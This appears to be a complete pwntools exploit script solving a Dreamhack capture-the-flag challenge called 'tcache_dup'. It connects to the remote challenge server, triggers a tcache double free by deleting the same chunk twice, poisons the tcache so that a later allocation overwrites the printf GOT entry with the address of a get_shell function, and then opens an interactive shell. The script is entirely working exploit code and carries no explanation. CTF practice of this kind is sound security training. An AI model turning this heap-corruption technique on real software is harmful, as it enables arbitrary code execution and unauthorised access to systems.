from pwn import *

p = remote("host3.dreamhack.games", 16484)
e = ELF('./tcache_dup')

printf_got = e.got["printf"]
get_shell = e.symbols["get_shell"]

def create(size: int, data: bytes):
    p.sendlineafter(b"> ", b"1")
    p.sendlineafter(b"Size: ", str(size).encode())
    p.sendafter(b"Data: ", data)

def delete(idx: int):
    p.sendlineafter(b"> ", b"2")
    p.sendlineafter(b"idx: ", str(idx).encode())

create(0x20, b"AAAA")
delete(0)
delete(0)
create(0x20, p64(printf_got))
create(0x20, b"AAAA")
create(0x20, p64(get_shell))

p.interactive()
